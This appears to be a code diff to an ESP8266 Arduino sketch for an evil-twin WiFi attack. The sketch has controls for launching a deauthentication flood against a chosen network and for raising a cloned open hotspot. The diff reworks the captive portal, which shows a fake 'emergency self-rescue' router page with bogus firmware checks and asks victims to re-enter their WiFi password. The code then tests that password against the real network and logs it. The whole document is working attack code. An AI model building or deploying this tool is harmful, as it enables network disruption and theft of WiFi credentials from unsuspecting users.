@@ -33,59 +33,79 @@ void clearArray() {
 
 }
 
+#define AP_IP IPAddress(192, 168, 123, 1)
+#define AP_GATEWAY IPAddress(255, 255, 255, 0)
+
 String _correct = "";
 String _tryPassword = "";
 
+String WIFI_SSID = "HUAWEI-668AVA";
+String WIFI_PASSWORD = "dokidoki";
+
+String FAKE_TITLE = "紧急自救模式";
 // Default main strings
-#define SUBTITLE "自我诊断模式"
-#define TITLE "<warning style='text-shadow: 1px 1px black;color:yellow;font-size:7vw;'>&#9888;</warning> 固件升级失败"
-#define BODY "路由器自动更新固件失败！<br><br>自检进度：Wifi模块异常，请输入密码重试！"
+String FAKE_HEAD = "<head><title>"+ FAKE_TITLE +"</title><meta name=viewport content='width=device-width,initial-scale=1'><style>"
+                   "article { background: #f2f2f2; padding: 1.3em; }"
+                   "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
+                   "div { padding: 0.5em; }"
+                   "h1 { margin: 0.5em 0 0 0; padding: 0.5em; font-size:7vw;}"
+                   "input { width: 50%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
+                   "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
+                   "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
+                   "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; }"
+                   "textarea { width: 100%; }"
+                   "</style> <meta http-equiv='Content-Type' content='text/html; charset=utf-8'></head>";
+String FAKE_BODY = "<body><nav>"+ FAKE_TITLE +"</nav> <div><div>"
+                    "设备硬件版本验证 ✅ <br>"
+                    "设备硬件自检 ✅ <br>"
+                    "设备版本号验证 ✅ <br>"
+                    "设备固件MD5校验 ✅ <br>"
+                    "设备配置文件校验 ✅ <br>"
+                    "设备Wifi模块独立校验 ✖"
+                    "</div><div> ⚠️ 读取WIFI密码异常，请重新输入Wifi密码重置Wifi </div><div>"
+                    "<form action='/' method=post> <input type=password id='password' name='password' minlength='8' placeholder='WIFI 密码'>"
+                    "</input> <input type=submit value=重试></input>"
+                    "</form></div><div class=q><a>&#169; All rights reserved.</a></div></div></body>";
 
-String header(String t) {
-  String a = String(_selectedNetwork.ssid);
-  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
-               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
-               "div { padding: 0.5em; }"
-               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; font-size:7vw;}"
-               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
-               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
-               "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
-               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
-               "textarea { width: 100%; }"
-               ;
-  String h = "<!DOCTYPE html><html>"
-             "<head><title><center>" + a + " :: " + t + "</center></title>"
-             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
-             "<style>" + CSS + "</style>"
-             "<meta charset=\"UTF-8\"></head>"
-             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
-  return h;
-}
+String FAKE_SERVER_VERIFY = "<!DOCTYPE html><html><head><title>紧急自救模式</title>"
+                    "<script> setTimeout(function(){window.location.href = '/result';}, 30000); </script>"
+                    "<style>nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }</style>"
+                    "<meta http-equiv='Content-Type' content='text/html; charset=utf-8'></head>"
+                    "<body><nav>紧急自救模式</nav><center><h2 style='font-size:4vw'>验证WIFI中, 请稍后...<br>"
+                    "<progress value='33' max='100'>33%</progress></h2></center></body></html>";
 
-String footer() {
-  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
-}
+String FAKE_SERVER_ERROR_PWD = "<!DOCTYPE html><html><head><title>紧急自救模式</title>"
+                    "<script> setTimeout(function(){window.location.href = '/result';}, 30000); </script><style>"
+                    "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }</style>"
+                    "<meta http-equiv='Content-Type' content='text/html; charset=utf-8'>"
+                    "<script> setTimeout(function(){window.location.href = '/';}, 4000); </script>"
+                    "<meta http-equiv='Content-Type' content='text/html; charset=utf-8'><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
+                    "<body><nav>紧急自救模式</nav><center><h2><wrong style='text-shadow: 1px 1px black;color:red;font-size:40px;width:40px;height:40px'>&#8855;</wrong>"
+                    "<br>密码错误</h2></body></html>";
 
-String index() {
-  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action='/' method=post><label>WiFi 密码:</label>" +
-         "<input type=password id='password' name='password' minlength='8'></input><input type=submit value=重试></form>" + footer();
-}
+String MainServerTemp = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
+                  "<meta http-equiv='Content-Type' content='text/html; charset=utf-8'>"
+                  "<style>.content {max-width: 50%;margin: auto;}.button {display: inline-block;padding: 10px 20px;border: none;border-radius: 8px;cursor: pointer;transition: background-color 0.3s;background-color: #007bff;color: #fff;}.button:hover {background-color: #333;}.button-table {display: inline-block;padding: 5px 10px;border: none;border-radius: 5px;cursor: pointer;transition: background-color 0.3s;background-color: #007bff;color: #fff;}.button-table:hover {background-color: #333;color: #fff;}.button-table-selected {display: inline-block;padding: 5px 10px;border: none;border-radius: 5px;cursor: pointer;transition: background-color 0.3s;background-color: #28a745;color: #fff;}table {width: 100%; border-collapse: collapse;margin: 12px auto;border-radius: 8px;}th,td {padding: 5px; border: 1px solid #ddd; text-align: center;}th {background-color: #f0f0f0; font-weight: bold; }tr:nth-child(even) { background-color: #f9f9f9;}@media (max-width: 768px) {.content {max-width: 90%;margin: auto;}th,td {font-size: 12px; }}</style>"
+                  "</head><body><div class='content'>"
+                  "<div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'><button class='button button-primary' {disabled}>{deauth_button}</button></form></div><div><form style='display:inline-block;' method='post'action='/?hotspot={hotspot}'><button class='button button-primary' {disabled}>{hotspot_button}</button></form></div></br><table><tr><th>名称</th><th>MAC地址</th><th>频道</th><th>操作</th></tr>";
 
 void setup() {
 
   Serial.begin(115200);
+
   WiFi.mode(WIFI_AP_STA);
   wifi_promiscuous_enable(1);
-  WiFi.softAPConfig(IPAddress(192, 168, 123, 1) , IPAddress(192, 168, 123, 1) , IPAddress(255, 255, 255, 0));
-  WiFi.softAP("HUAWEI-668AVA", "dokidoki");
-  dnsServer.start(53, "*", IPAddress(192, 168, 123, 1));
+  WiFi.softAPConfig(AP_IP , AP_IP , AP_GATEWAY);
+  WiFi.softAP(WIFI_SSID, WIFI_PASSWORD);
+  dnsServer.start(53, "*", AP_IP);
 
   webServer.on("/", handleIndex);
   webServer.on("/result", handleResult);
-  webServer.on("/dokidoki", handleAdmin);
+  webServer.on("/manager", handleAdmin);
   webServer.onNotFound(handleIndex);
   webServer.begin();
 }
+
 void performScan() {
   int n = WiFi.scanNetworks();
   clearArray();
@@ -112,11 +132,7 @@ void handleResult() {
     if (webServer.arg("deauth") == "start") {
       deauthing_active = true;
     }
-    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 4000); </script>"
-      "<meta http-equiv='Content-Type' content='text/html; charset=utf-8'>"
-      "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
-      "<body><center><h2><wrong style='text-shadow: 1px 1px black;color:red;font-size:60px;width:60px;height:60px'>&#8855;</wrong>"
-      "<br>密码错误！</h2><p>请确认密码重试！</p></center></body> </html>");
+    webServer.send(200, "text/html", FAKE_SERVER_ERROR_PWD);
     Serial.println("Someone entered the wrong WIFI password. ["+_tryPassword+"]");
   } else {
     if (_selectedNetwork.ssid != "" && _tryPassword != ""){
@@ -126,18 +142,11 @@ void handleResult() {
     hotspot_active = false;
     dnsServer.stop();
     int n = WiFi.softAPdisconnect (true);
-    WiFi.softAPConfig(IPAddress(192, 168, 123, 1) , IPAddress(192, 168, 123, 1) , IPAddress(255, 255, 255, 0));
-    WiFi.softAP("HUAWEI-668AVA", "dokidoki");
-    dnsServer.start(53, "*", IPAddress(192, 168, 123, 1));
+    WiFi.softAPConfig(AP_IP , AP_IP , AP_GATEWAY);
+    WiFi.softAP(WIFI_SSID, WIFI_PASSWORD);
+    dnsServer.start(53, "*", AP_IP);
   }
 }
-
-
-String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
-                  "<meta http-equiv='Content-Type' content='text/html; charset=utf-8'>"
-                  "<style>.content {max-width: 50%;margin: auto;}.button {display: inline-block;padding: 10px 20px;border: none;border-radius: 8px;cursor: pointer;transition: background-color 0.3s;background-color: #007bff;color: #fff;}.button:hover {background-color: #333;}.button-table {display: inline-block;padding: 5px 10px;border: none;border-radius: 5px;cursor: pointer;transition: background-color 0.3s;background-color: #007bff;color: #fff;}.button-table:hover {background-color: #333;color: #fff;}.button-table-selected {display: inline-block;padding: 5px 10px;border: none;border-radius: 5px;cursor: pointer;transition: background-color 0.3s;background-color: #28a745;color: #fff;}table {width: 100%; border-collapse: collapse;margin: 12px auto;border-radius: 8px;}th,td {padding: 5px; border: 1px solid #ddd; text-align: center;}th {background-color: #f0f0f0; font-weight: bold; }tr:nth-child(even) { background-color: #f9f9f9;}@media (max-width: 768px) {.content {max-width: 90%;margin: auto;}th,td {font-size: 12px; }}</style>"
-                  "</head><body><div class='content'>"
-                  "<div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'><button class='button button-primary' {disabled}>{deauth_button}</button></form></div><div><form style='display:inline-block;' method='post'action='/?hotspot={hotspot}'><button class='button button-primary' {disabled}>{hotspot_button}</button></form></div></br><table><tr><th>名称</th><th>MAC地址</th><th>频道</th><th>操作</th></tr>";
 
 void handleIndex() {
 
@@ -163,23 +172,23 @@ void handleIndex() {
 
       dnsServer.stop();
       int n = WiFi.softAPdisconnect (true);
-      WiFi.softAPConfig(IPAddress(192, 168, 123, 1) , IPAddress(192, 168, 123, 1) , IPAddress(255, 255, 255, 0));
+      WiFi.softAPConfig(AP_IP , AP_IP , AP_GATEWAY);
       WiFi.softAP(_selectedNetwork.ssid.c_str());
-      dnsServer.start(53, "*", IPAddress(192, 168, 123, 1));
+      dnsServer.start(53, "*", AP_IP);
 
     } else if (webServer.arg("hotspot") == "stop") {
       hotspot_active = false;
       dnsServer.stop();
       int n = WiFi.softAPdisconnect (true);
-      WiFi.softAPConfig(IPAddress(192, 168, 123, 1) , IPAddress(192, 168, 123, 1) , IPAddress(255, 255, 255, 0));
-      WiFi.softAP("HUAWEI-668AVA", "dokidoki");
-      dnsServer.start(53, "*", IPAddress(192, 168, 123, 1));
+      WiFi.softAPConfig(AP_IP , AP_IP , AP_GATEWAY);
+      WiFi.softAP(WIFI_SSID, WIFI_PASSWORD);
+      dnsServer.start(53, "*", AP_IP);
     }
     return;
   }
 
   if (hotspot_active == false) {
-    String _html = _tempHTML;
+    String _html = MainServerTemp;
 
     for (int i = 0; i < 16; ++i) {
       if ( _networks[i].ssid == "") {
@@ -194,19 +203,21 @@ void handleIndex() {
       }
     }
 
+    String showedName = _selectedNetwork.ssid==""?"":"["+_selectedNetwork.ssid+"]";
+
     if (deauthing_active) {
-      _html.replace("{deauth_button}", "停止["+_selectedNetwork.ssid+"]断网攻击");
+      _html.replace("{deauth_button}", "停止"+showedName+"断网攻击");
       _html.replace("{deauth}", "stop");
     } else {
-      _html.replace("{deauth_button}", "启动["+_selectedNetwork.ssid+"]断网攻击");
+      _html.replace("{deauth_button}", "启动"+showedName+"断网攻击");
       _html.replace("{deauth}", "start");
     }
 
     if (hotspot_active) {
-      _html.replace("{hotspot_button}", "停止["+_selectedNetwork.ssid+"]钓鱼热点");
+      _html.replace("{hotspot_button}", "停止"+showedName+"钓鱼热点");
       _html.replace("{hotspot}", "stop");
     } else {
-      _html.replace("{hotspot_button}", "启动["+_selectedNetwork.ssid+"]钓鱼热点");
+      _html.replace("{hotspot_button}", "启动"+showedName+"钓鱼热点");
       _html.replace("{hotspot}", "start");
     }
 
@@ -236,14 +247,12 @@ void handleIndex() {
       delay(1000);
       WiFi.disconnect();
       WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
-      webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script>" 
-        "<meta http-equiv='Content-Type' content='text/html; charset=utf-8'>" 
-        "</head><body><center><h2 style='font-size:7vw'>验证WIFI中, 请稍后...<br><progress value='10' max='100'>10%</progress></h2></center></body> </html>");
+      webServer.send(200, "text/html", FAKE_SERVER_VERIFY);
       if (webServer.arg("deauth") == "start") {
         deauthing_active = true;
       }
     } else {
-      webServer.send(200, "text/html", index());
+      webServer.send(200, "text/html", FAKE_HEAD+FAKE_BODY);
     }
   }
 
@@ -251,7 +260,7 @@ void handleIndex() {
 
 void handleAdmin() {
 
-  String _html = _tempHTML;
+  String _html = MainServerTemp;
 
   if (webServer.hasArg("ap")) {
     for (int i = 0; i < 16; i++) {
@@ -270,22 +279,22 @@ void handleAdmin() {
   }
 
   if (webServer.hasArg("hotspot")) {
-    if (webServer.arg("hotspot") == "start") {
+    if (webServer.arg("hotspot") == "start" && _selectedNetwork.ssid.c_str() != "") {
       hotspot_active = true;
 
       dnsServer.stop();
       int n = WiFi.softAPdisconnect (true);
-      WiFi.softAPConfig(IPAddress(192, 168, 123, 1) , IPAddress(192, 168, 123, 1) , IPAddress(255, 255, 255, 0));
+      WiFi.softAPConfig(AP_IP , AP_IP , AP_GATEWAY);
       WiFi.softAP(_selectedNetwork.ssid.c_str());
-      dnsServer.start(53, "*", IPAddress(192, 168, 123, 1));
+      dnsServer.start(53, "*", AP_IP);
 
     } else if (webServer.arg("hotspot") == "stop") {
       hotspot_active = false;
       dnsServer.stop();
       int n = WiFi.softAPdisconnect (true);
-      WiFi.softAPConfig(IPAddress(192, 168, 123, 1) , IPAddress(192, 168, 123, 1) , IPAddress(255, 255, 255, 0));
-      WiFi.softAP("HUAWEI-668AVA", "dokidoki");
-      dnsServer.start(53, "*", IPAddress(192, 168, 123, 1));
+      WiFi.softAPConfig(AP_IP , AP_IP , AP_GATEWAY);
+      WiFi.softAP(WIFI_SSID, WIFI_PASSWORD);
+      dnsServer.start(53, "*", AP_IP);
     }
     return;
   }
@@ -351,6 +360,7 @@ String bytesToStr(const uint8_t* b, uint32_t size) {
 unsigned long now = 0;
 unsigned long wifinow = 0;
 unsigned long deauth_now = 0;
+unsigned int wifiStatus = WL_DISCONNECTED;
 
 uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
 uint8_t wifi_channel = 1;
@@ -384,10 +394,12 @@ void loop() {
     now = millis();
   }
 
-  if (millis() - wifinow >= 2000) {
-    // if (WiFi.status() != WL_CONNECTED) {
-    //   Serial.println("Wifi not connect to manager.");
-    // }
+  if (millis() - wifinow >= 1000) {
+    int status = WiFi.status();
+    if(status != wifiStatus){
+      Serial.println(status == WL_CONNECTED?"Someone connect to AP." : "Wifi AP Stauts -> " + status);
+    }
+    wifiStatus = status;
     wifinow = millis();
   }
 }
